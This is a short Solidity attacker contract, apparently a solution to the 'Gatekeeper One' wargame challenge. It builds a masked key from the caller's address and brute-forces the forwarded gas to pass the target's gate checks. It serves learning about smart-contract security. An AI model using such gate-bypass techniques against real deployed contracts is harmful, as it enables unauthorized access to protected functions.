// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GateKeeperOneContract.sol";

contract GateKeeper1Attacker {

    GatekeeperOneContract public gateKeeper = GatekeeperOneContract(0x965FC0477F870A16a39d98DdA23000d0BFC27ba5);

    function enter() external {
        bytes8 key = bytes8(uint64(uint160(address(msg.sender)))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(gateKeeper).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                break;
            }
        }
    }
}
